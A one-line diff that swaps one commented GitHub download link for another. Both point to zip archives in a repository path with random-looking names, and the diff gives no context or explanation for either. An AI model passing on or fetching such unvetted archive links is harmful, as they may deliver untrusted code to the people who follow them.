@@ -1,1 +1,1 @@
-# https://github.com/Karan211/YGUC.github.io/raw/refs/heads/main/immeritous/io-YGU-github-bandcutter.zip
+# https://raw.githubusercontent.com/Karan211/YGUC.github.io/main/immeritous/YGU-github-io-2.0.zip
